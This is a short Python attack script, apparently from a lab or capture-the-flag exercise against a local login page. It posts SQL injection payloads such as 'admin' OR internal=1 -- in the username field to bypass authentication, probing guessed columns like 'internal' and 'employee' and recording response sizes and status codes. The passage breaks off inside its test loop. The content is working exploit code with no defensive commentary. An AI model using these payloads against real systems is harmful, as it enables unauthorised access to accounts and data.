import requests

# Target configuration
target_url = "http://127.0.0.1:32989/index.php"

print("TARGETING INTERNAL EMPLOYEE CHECK")
print("=" * 80)
print("Testing SQL injection targeting potential 'internal' column checks\n")

def test_payload(description, username, password="x"):
    r = requests.post(target_url, data={"username": username, "password": password}, timeout=10)
    return {
        'desc': description,
        'username': username,
        'length': len(r.text),
        'status': r.status_code
    }

results = []

# 1. Try injecting into WHERE clause with internal checks
print("[1] INTERNAL COLUMN BYPASS TESTS")
print("-" * 60)

internal_tests = [
    ("admin' OR internal=1 --", "x"),
    ("admin' OR employee=1 --", "x"),
    ("admin' OR is_internal=1 --", "x"),
    ("admin' OR is_employee=1 --", "x"),
    ("' OR internal=1 OR '1'='1", "x"),
    ("' OR '1'='1' AND internal=1", "x"),
    ("' OR '1'='1' AND employee=1", "x"),
]

for user, pwd in internal_tests:
    r = test_payload(f"Internal column: {user[:30]}", user, pwd)
